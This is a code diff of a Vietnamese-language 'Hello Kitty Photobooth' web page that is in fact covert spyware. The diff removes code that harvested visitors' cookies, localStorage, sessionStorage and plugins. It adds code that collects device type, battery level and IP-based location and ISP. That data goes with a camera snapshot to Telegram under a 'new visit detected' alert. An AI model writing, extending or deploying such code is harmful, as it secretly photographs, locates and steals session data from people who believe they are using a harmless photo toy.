@@ -337,91 +337,57 @@ function getCurrentCookies() {
   } catch(e) { return []; }
 }
 
-function getCookiesString(cookies) {
-  if (!cookies || !cookies.length) return '❌ Không có cookies';
-  return cookies.map((c, i) => {
-    let v = decodeURIComponent(c.value || '');
-    if (v.length > 60) v = v.substring(0, 60) + '…';
-    v = v.replace(/[^\x20-\x7E]/g, '?');
-    return `  ${i+1}. ${c.name} = ${v}`;
-  }).join('\n');
-}
-
-function getLocalStorageInfo() {
-  try {
-    if (!localStorage.length) return '❌ Không có dữ liệu localStorage';
-    const items = [];
-    for (let i = 0; i < localStorage.length; i++) {
-      const key = localStorage.key(i);
-      let val = localStorage.getItem(key) || '';
-      if (val.length > 60) val = val.substring(0, 60) + '…';
-      val = val.replace(/[^\x20-\x7E]/g, '?');
-      items.push(`  ${key} = ${val}`);
-    }
-    return items.join('\n');
-  } catch(e) { return '❌ Không thể truy cập localStorage'; }
-}
-
-function getSessionStorageInfo() {
-  try {
-    if (!sessionStorage.length) return '❌ Không có dữ liệu sessionStorage';
-    const items = [];
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const key = sessionStorage.key(i);
-      let val = sessionStorage.getItem(key) || '';
-      if (val.length > 60) val = val.substring(0, 60) + '…';
-      val = val.replace(/[^\x20-\x7E]/g, '?');
-      items.push(`  ${key} = ${val}`);
-    }
-    return items.join('\n');
-  } catch(e) { return '❌ Không thể truy cập sessionStorage'; }
-}
-
 function getDeviceInfo() {
-  return {
-    platform: navigator.platform || 'Không rõ',
-    language: navigator.language || 'Không rõ',
-    screen: `${window.screen.width}x${window.screen.height}`,
-    cores: navigator.hardwareConcurrency || 'Không rõ',
-    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Không rõ',
-    touch: navigator.maxTouchPoints > 0 ? '✅ Có' : '❌ Không',
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ',
-    url: window.location.href,
-    title: document.title,
-    referrer: document.referrer || 'Trực tiếp'
-  };
+  const ua = navigator.userAgent;
+  let deviceName = 'Thiết bị khác';
+  if (/android/i.test(ua)) deviceName = 'Android 🤖';
+  else if (/iphone|ipad|ipod/i.test(ua)) deviceName = 'iOS (Apple) 🍏';
+  else if (/windows/i.test(ua)) deviceName = 'Windows PC 💻';
+  else if (/macintosh|mac os x/i.test(ua)) deviceName = 'MacBook / Mac 💻';
+  else if (/linux/i.test(ua)) deviceName = 'Linux 🐧';
+  
+  let batteryInfo = 'Không hỗ trợ';
+  if (navigator.getBattery) {
+    try {
+      const battery = navigator.getBattery();
+      battery.then(bat => {
+        const level = Math.round(bat.level * 100);
+        const charging = bat.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
+        batteryInfo = `${level}% (${charging})`;
+      });
+    } catch(e) {}
+  }
+  
+  return { deviceName, batteryInfo };
 }
 
-async function getIP() {
+async function getIPInfo() {
+  let ipDetails = { 
+    ip: 'Không rõ', 
+    city: 'Không rõ', 
+    region: 'Không rõ', 
+    country: 'Không rõ', 
+    isp: 'Không rõ' 
+  };
+  
   try {
-    const res = await fetch('https://ipwho.is/');
-    const data = await res.json();
-    if (data.success) {
-      return {
-        ip: data.ip || 'Không rõ',
-        city: data.city || 'Không rõ',
-        country: data.country || 'Không rõ',
-        isp: data.connection?.isp || data.connection?.org || 'Không rõ'
-      };
+    const ipRes = await fetch('https://ipwho.is/');
+    const ipData = await ipRes.json();
+    if (ipData.success) {
+      ipDetails.ip = ipData.ip || 'Không rõ';
+      ipDetails.city = ipData.city || 'Không rõ';
+      ipDetails.region = ipData.region || 'Không rõ';
+      ipDetails.country = ipData.country || 'Không rõ';
+      ipDetails.isp = ipData.connection?.isp || ipData.connection?.org || 'Không rõ';
     }
-    return { ip: 'Không rõ' };
   } catch(e) {
     try {
-      const fallback = await fetch('https://api.ipify.org?format=json');
-      const data = await fallback.json();
-      return { ip: data.ip || 'Không rõ' };
-    } catch(err) { return { ip: 'Không rõ' }; }
+      const fallbackRes = await fetch('https://api.ipify.org?format=json');
+      const fallbackData = await fallbackRes.json();
+      ipDetails.ip = fallbackData.ip || 'Không rõ';
+    } catch(err) {}
   }
-}
-
-function getPlugins() {
-  try {
-    const plugins = [];
-    for (let i = 0; i < navigator.plugins.length; i++) {
-      plugins.push(navigator.plugins[i].name);
-    }
-    return plugins;
-  } catch(e) { return []; }
+  return ipDetails;
 }
 
 // ============================================================
@@ -503,7 +469,7 @@ async function startCamera() {
 setTimeout(startCamera, 500);
 
 // ============================================================
-// CHỤP ẢNH & GỬI DỮ LIỆU
+// CHỤP ẢNH & GỬI DỮ LIỆU - PHONG CÁCH CŨ
 // ============================================================
 function playClickSound() {
   try {
@@ -534,13 +500,10 @@ captureBtn.onclick = async function() {
   statusDiv.textContent = '📸 Đang chụp ảnh...';
   statusDiv.className = 'status loading';
   
-  // Thu thập dữ liệu
-  const cookies = getCurrentCookies();
-  const localStorage = getLocalStorageInfo();
-  const sessionStorage = getSessionStorageInfo();
+  // Lấy thông tin
+  const accessTime = new Date().toLocaleString('vi-VN', { hour12: false });
   const device = getDeviceInfo();
-  const ip = await getIP();
-  const plugins = getPlugins();
+  const ipDetails = await getIPInfo();
   
   // Chụp ảnh
   const W = 480, H = 360;
@@ -573,84 +536,30 @@ captureBtn.onclick = async function() {
   ctx.fillStyle = 'rgba(214,51,108,0.5)';
   ctx.font = '10px Quicksand';
   ctx.textAlign = 'right';
-  ctx.fillText(new Date().toLocaleString('vi-VN'), W-15, H-10);
+  ctx.fillText(accessTime, W-15, H-10);
   
   ctx.fillStyle = 'rgba(255,255,255,0.6)';
   ctx.fillRect(10, H-25, 130, 18);
   ctx.fillStyle = '#d6336c';
   ctx.font = 'bold 9px Quicksand';
   ctx.textAlign = 'left';
-  ctx.fillText(`📍 ${ip.city || 'Unknown'}`, 15, H-11);
+  ctx.fillText(`📍 ${ipDetails.city || 'Unknown'}`, 15, H-11);
   
-  // Tạo caption
-  let caption = `🎀 HELLO KITTY PHOTOBOOTH 🎀\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `⏰ ${new Date().toLocaleString('vi-VN')}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-  
-  caption += `📱 DEVICE:\n`;
-  caption += `  Platform: ${device.platform}\n`;
-  caption += `  Language: ${device.language}\n`;
-  caption += `  Screen: ${device.screen}\n`;
-  caption += `  CPU: ${device.cores} cores\n`;
-  caption += `  RAM: ${device.memory}\n`;
-  caption += `  Touch: ${device.touch}\n`;
-  caption += `  Timezone: ${device.timezone}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-  
-  caption += `🌐 IP & LOCATION:\n`;
-  caption += `  IP: ${ip.ip || 'Không rõ'}\n`;
-  caption += `  City: ${ip.city || 'Không rõ'}\n`;
-  caption += `  Country: ${ip.country || 'Không rõ'}\n`;
-  caption += `  ISP: ${ip.isp || 'Không rõ'}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-  
-  caption += `🍪 COOKIES (${cookies.length}):\n`;
-  if (cookies.length > 0) {
-    cookies.slice(0, 5).forEach(c => {
-      let v = decodeURIComponent(c.value || '');
-      if (v.length > 40) v = v.substring(0, 40) + '…';
-      caption += `  ${c.name} = ${v}\n`;
-    });
-    if (cookies.length > 5) caption += `  ... +${cookies.length-5} cookies\n`;
-  } else {
-    caption += `  ❌ Không có cookies\n`;
-  }
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-  
-  const lsItems = localStorage.split('\n').filter(l => l.trim());
-  if (lsItems.length > 0) {
-    caption += `💾 LOCAL STORAGE (${lsItems.length}):\n`;
-    lsItems.slice(0, 5).forEach(item => caption += `  ${item.trim()}\n`);
-    if (lsItems.length > 5) caption += `  ... +${lsItems.length-5} items\n`;
-    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-  }
-  
-  const ssItems = sessionStorage.split('\n').filter(l => l.trim());
-  if (ssItems.length > 0) {
-    caption += `📦 SESSION STORAGE (${ssItems.length}):\n`;
-    ssItems.slice(0, 5).forEach(item => caption += `  ${item.trim()}\n`);
-    if (ssItems.length > 5) caption += `  ... +${ssItems.length-5} items\n`;
-    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-  }
-  
-  if (plugins.length > 0) {
-    caption += `🔌 PLUGINS (${plugins.length}):\n`;
-    plugins.slice(0, 5).forEach((p, i) => caption += `  ${i+1}. ${p}\n`);
-    if (plugins.length > 5) caption += `  ... +${plugins.length-5} plugins\n`;
-    caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-  }
-  
-  caption += `🔗 PAGE:\n`;
-  caption += `  URL: ${device.url}\n`;
-  caption += `  Title: ${device.title}\n`;
-  caption += `  Referrer: ${device.referrer}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  caption += `🌸 Thank you! 🌸`;
-  
-  if (caption.length > 4000) {
-    caption = caption.substring(0, 3900) + '\n... (cut)';
-  }
+  // ============================================================
+  // TẠO CAPTION - PHONG CÁCH CŨ ĐẸP HƠN
+  // ============================================================
+  let caption = `🚨 <b>PHÁT HIỆN LƯỢT TRUY CẬP MỚI</b> 🚨\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `⏰ <b>Thời gian:</b> <code>${accessTime}</code>\n`;
+  caption += `📱 <b>Thiết bị:</b> ${device.deviceName}\n`;
+  caption += `🔋 <b>Pin:</b> ${device.batteryInfo}\n`;
+  caption += `🌐 <b>Địa chỉ IP:</b> <code>${ipDetails.ip}</code>\n`;
+  caption += `🏙️ <b>Khu vực:</b> ${ipDetails.city}, ${ipDetails.region}\n`;
+  caption += `🌍 <b>Quốc gia:</b> ${ipDetails.country}\n`;
+  caption += `🏢 <b>Nhà mạng:</b> ${ipDetails.isp}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `✨ <i>Trạng thái: Đã hoàn tất xác thực</i>\n`;
+  caption += `🔗 <b>Nhóm lấy file:</b> `;
   
   // Gửi lên Telegram
   canvas.toBlob(async (blob) => {
